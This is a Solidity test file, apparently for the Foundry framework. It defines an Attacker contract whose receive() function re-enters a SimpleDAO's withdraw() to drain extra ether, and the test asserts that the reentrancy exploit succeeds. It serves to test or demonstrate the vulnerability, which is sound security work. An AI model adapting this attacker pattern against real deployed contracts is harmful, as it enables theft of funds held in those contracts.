
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {
    SimpleDAO public _simpleDAO;
    Attacker public _attacker;

    function setUp() public {
        _simpleDAO = new SimpleDAO();
        _attacker = new Attacker(address(_simpleDAO));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal < address(this).balance / 2);
        
        vm.deal(address(_simpleDAO), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    SimpleDAO public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.donate{value: msg.value}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        storedAttackVal = val;
        
        victim.withdraw(val);
        
        if (attackCallCount >= 2 && address(victim).balance < initialSnapshot - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.withdraw(storedAttackVal);
        }
    }
}
